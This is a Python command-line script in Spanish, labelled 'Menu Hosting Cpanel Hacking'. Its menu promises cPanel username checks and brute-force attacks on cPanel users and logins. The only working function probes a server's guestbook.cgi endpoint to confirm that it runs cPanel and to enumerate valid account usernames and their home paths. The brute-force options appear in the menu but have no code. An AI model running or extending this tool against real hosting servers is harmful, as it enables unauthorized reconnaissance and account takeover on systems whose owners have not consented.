import os
import argparse
import requests

def menu():
	print(""" Menu Hosting Cpanel Hacking\n """)

	menu=""" Seleccione una Opcion:
   [1]: Verificar Usuario Cpanel
   [2]: Fuerza Bruta Usuario Cpanel
   [3]: Fuerza Bruta Acceso Cpanel
   [4]: Salir

Codigo By Ansec0x
"""
	print (menu)

def verificar_cpanel(x):
	try:
		if x:
			cgi="cgi-sys/guestbook.cgi?user="
			link=x+cgi
			session=requests.Session()
			response=session.get(link)
			response_cgi=response.text
			os.system('clear')
			if 'Not Found' in response_cgi:
				print ("-------------------")
				print ("\n[*] No es Cpanel")
				print ("-------------------")
				return False
			else:
				return True

	except requests.exceptions.ConnectionError as e:
		print ("-----------------------------------------------------------------")
		print ("No olvidar ingresar el [/] al final de la URL http://hosting.com/")
		print ("-----------------------------------------------------------------")
		print ("\n")

def validar_usuario(x,y):
	try:
		if x:
			user=y
			cgi="cgi-sys/guestbook.cgi?user="
			link=x+cgi
			session=requests.Session()
			response=session.get(link)
			response_cgi=response.text
			os.system('clear')
			if verificar_cpanel(x) == False:
				pass
			else:
				link=link+y
				response=requests.get(link)
				response_cgi=response.text
				real="/home/"+y
				if 'Invalid username' in response_cgi:
					print ("[+]Usuario InCorrecto: {}".format(y))
					print ("\n")
				elif real in response_cgi:
					print ("[+]Usuario Correcto: {}".format(y))
					r=response_cgi.split()
					print(r[4])
					print ("\n")

	except requests.exceptions.ConnectionError as e:
		pass


def verificar_entrada_1(x):
	os.system('clear')
	if x.startswith("http://"):
		pass
	elif x.startswith("https://"):
		pass
	else:
		print ("----------------------------------------")
		print ("\nIngrese Url con [http://] y [https://]\n")
		print ("----------------------------------------")
		x.close()

def verificar_usuario():
	os.system('clear')
	data="""\nOpcion [1] Verificiar Usuarios Cpanel
		
	Opciones de Ingreso:
	   [*]Ingresar Dominio Completo
	   		http/(https)://hosting.com/
	   [*]Ingresar Usuario
	"""
	print (data)
	dominio=input("\nIngrese URL:  ")
	verificar_entrada_1(dominio)
	if verificar_cpanel(dominio):
		usuario=input("\nIngrese Usuario:  ")
		validar_usuario(dominio,usuario)
	else:
		pass


if __name__=="__main__":
	menu()
	while True:
	    try:
	        opcion= input("Menu Opcion:  ")
	        opcion = int(opcion)
	        if opcion==1:
	        	verificar_usuario()
	        if opcion==4:
	        	break

	    except ValueError:
	        pass
	    menu()
